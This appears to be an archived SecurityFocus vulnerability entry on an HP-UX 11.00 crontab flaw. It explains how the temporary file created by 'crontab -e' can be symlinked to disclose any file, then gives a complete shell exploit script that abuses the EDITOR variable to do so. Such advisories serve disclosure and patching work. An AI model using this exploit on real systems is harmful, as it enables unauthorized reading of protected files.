source: https://www.securityfocus.com/bid/1845/info

crontab is a binary in the cron package of the HP-UX cron implementation which allows a user to create a file of scheduled commands. A vulnerabiltiy in crontab exists that allows a user to read any file on an HP-UX system. crontab as implemented with HP-UX is a access controlled binary. Users are permitted to run crontab only if they have an access entry in the crontab.allow file.

To create a crontab, a user must execute the command "crontab -e." Executing this command launches the vi editor, creates a file in the /tmp directory with the ownership delegated to the user running the command. While the file exists in /tmp, the owner of the file may spawn a shell from vi and create a symbolic link to any file on the system. After exiting the spawned shell, then quitting vi, an error message will return the contents of the previously symbolically linked file to the standard output of the user.


#!/bin/sh
#
#  HP-UX 11.00 crontab
#
#  Kyong-won,Cho
#
#             dubhe@hackerslab.com
#
#  Usage : ./crontab.sh <distfile>
#
#

if [ -z "$1" ]
then

echo "Usage : $0 <distfile>"
exit

fi

cat << _EOF_ > /tmp/crontab_exp
#!/bin/sh

ln -sf $1 \$1

_EOF_

chmod 755 /tmp/crontab_exp

EDITOR=/tmp/crontab_exp
export EDITOR

crontab -e 2> /tmp/crontab$$

grep -v "error on previous line" /tmp/crontab$$

rm -f /tmp/crontab_exp /tmp/crontab$$